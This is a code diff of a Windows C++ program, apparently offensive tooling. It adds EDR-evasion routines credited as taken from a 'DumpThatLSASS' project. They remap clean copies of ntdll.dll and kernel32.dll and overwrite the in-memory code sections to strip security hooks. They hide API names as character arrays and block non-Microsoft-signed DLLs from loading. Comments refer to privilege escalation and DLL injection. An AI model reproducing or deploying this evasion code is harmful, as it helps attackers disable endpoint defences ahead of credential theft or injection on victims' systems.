@@ -11,6 +11,12 @@
 #include <sstream>
 #include <numeric>
 
+typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
+typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
+VirtualProtect_t VirtualProtect_p = NULL;
+
 using namespace std;
 
 map< char, string > ascii_to_morse =
@@ -255,41 +261,114 @@ void unhook(char* modulePath, char* oriModulePath, const char* moduleName, HANDL
     FreeLibrary(ntdllModule);
 }
 
-int main()
-{
-    //implement privilege escalation here
-    //https://github.com/KooroshRZ/Windows-DLL-Injector/blob/61f30f3a9750600d09a19761515892e4582ec434/Injector/src
-
-    // this is to iterate all modules loaded by the loader
+//code stolen from https://github.com/D1rkMtr/DumpThatLSASS/blob/main/MiniDump/Source.cpp
+static int UnhookModule(const HMODULE hDbghelp, const LPVOID pMapping) {
     /*
-#ifdef _M_IX86
-    PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
-#else
-    PEB* ProcEnvBlk = (PEB *)__readgsqword(0x60);
-#endif
-    PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr;
-    LIST_ENTRY* ModuleList = NULL;
-    ModuleList = &Ldr->InMemoryOrderModuleList;
-    LIST_ENTRY* pStartListEntry = ModuleList->Flink;
+        UnhookDbghelp() finds .text segment of fresh loaded copy of Dbghelp.dll and copies over the hooked one
+    */
+    DWORD oldprotect = 0;
+    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
+    PIMAGE_NT_HEADERS pinhpinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
+    int i;
 
-    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
-    {
-        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
-        if (lstrcmpiW(pEntry->BaseDllName.Buffer, L"ntdll.dll") == 0)
-        {
-            printf("%p %wZ\n", &pEntry->DllBase, &pEntry->BaseDllName);
+
+    // find .text section
+    for (i = 0; i < pinhpinh->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER pishpish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinhpinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+        if (!strcmp((char*)pishpish->Name, ".text")) {
+            // prepare hDbghelp.dll memory region for write permissions.
+            VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pishpish->VirtualAddress), pishpish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
+            if (!oldprotect) {
+                // RWX failed!
+                return -1;
+            }
+            // copy original .text section into hDbghelp memory
+            memcpy((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pishpish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pishpish->VirtualAddress), pishpish->Misc.VirtualSize);
+
+            // restore original protection settings of hDbghelp
+            VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pishpish->VirtualAddress), pishpish->Misc.VirtualSize, oldprotect, &oldprotect);
+            if (!oldprotect) {
+                // it failed
+                return -1;
+            }
+            // all is good, time to go home
+            return 0;
         }
     }
-    */
+    // .text section not found?
+    return -1;
+}
 
+//code stolen from https://github.com/D1rkMtr/DumpThatLSASS/blob/main/MiniDump/Source.cpp
+void FreshCopy(unsigned char* sKernel32, unsigned char* modulePath, unsigned char* moduleName) {
+    unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
+    unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
+    unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
+    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
+
+    int ret = 0;
+    HANDLE hFile;
+    HANDLE hFileMapping;
+    LPVOID pMapping;
+
+    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
+    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
+    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);
+    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);
+
+    // open the DLL
+    hFile = CreateFileA((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        // failed to open the DLL
+        printf("failed to open ntdll.dll %u", GetLastError());
+    }
+
+    // prepare file mapping
+    hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (!hFileMapping) {
+        // file mapping failed
+
+        CloseHandle(hFile);
+        printf("file mapping failed %u", GetLastError());
+    }
+
+    // map the bastard
+    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
+    if (!pMapping) {
+        // mapping failed
+        CloseHandle(hFileMapping);
+        CloseHandle(hFile);
+        printf("mapping failed %u", GetLastError());
+    }
+
+    // remove hooks
+    ret = UnhookModule(GetModuleHandleA((LPCSTR)moduleName), pMapping);
+
+    // Clean up.
+    UnmapViewOfFile_p(pMapping);
+    CloseHandle(hFileMapping);
+    CloseHandle(hFile);
+}
+
+int main()
+{
     //unhook all dlls
     HANDLE process = GetCurrentProcess();
-    char fullModulePath[21];
-    char modulePath[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\',0 };
-    memcpy(fullModulePath, modulePath, strlen(modulePath));
+    //char fullModulePath[21];
+    //char modulePath[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\',0 };
+    //memcpy(fullModulePath, modulePath, strlen(modulePath));
 
-    unhook(fullModulePath, modulePath, "ntdll.dll", process);
-    unhook(fullModulePath, modulePath, "kernel32.dll", process);
+    //unhook(fullModulePath, modulePath, "ntdll.dll", process);
+    //unhook(fullModulePath, modulePath, "kernel32.dll", process);
+
+    unsigned char sNtdllPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
+    unsigned char sKernel32Path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l',0 };
+    unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+    unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
+
+    FreshCopy(sKernel32, sNtdllPath, sNtdll);
+    FreshCopy(sKernel32, sKernel32Path, sKernel32);
 
     // Disallow non-MSFT signed DLL's from injecting
     PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
